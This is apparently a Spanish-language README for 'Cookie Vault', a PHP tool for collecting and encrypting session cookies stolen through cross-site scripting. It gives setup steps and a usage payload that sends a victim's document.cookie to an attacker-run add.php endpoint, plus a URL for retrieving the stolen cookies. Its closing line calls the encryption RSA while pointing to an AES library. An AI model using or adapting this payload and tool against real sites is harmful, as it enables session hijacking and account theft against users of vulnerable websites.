Cookie Vault
---
Pequeño script en PHP para almacenar de forma cifrada cookies obtenidas mediante XSS.

Instalación
---

1. Copiar los ficheros `query.php` y `add.php` junto a `AES.php` (http://aesencryption.net) en un servidor web con PHP y acceso a una base de datos MySQL.
2. Modificar la línea 49 del fichero `add.php` con la información necesaria para el acceso a la base de datos MySQL.
3. Modificar la línea 81 del fichero `add.php` con la segunda passphrase para la encriptación.
4. Ejecutar el fichero `import.sql` para importar la base de datos.

Uso
---
Añadir cookie en la base de datos:
```
"http://example.com/c_steal/add.php?URL=webvuln.com&KEY=p4ssphrase&COOKIE=" + document.cookie
```

Consultar cookies en la base de datos:
```
"http://example.com/c_steal/query.php?URL=webvuln.com&KEY=p4ssphrase
```

El algoritmo utilizado para el cifrado RSA (no incluido aquí) se encuentra disponible en: http://aesencryption.net
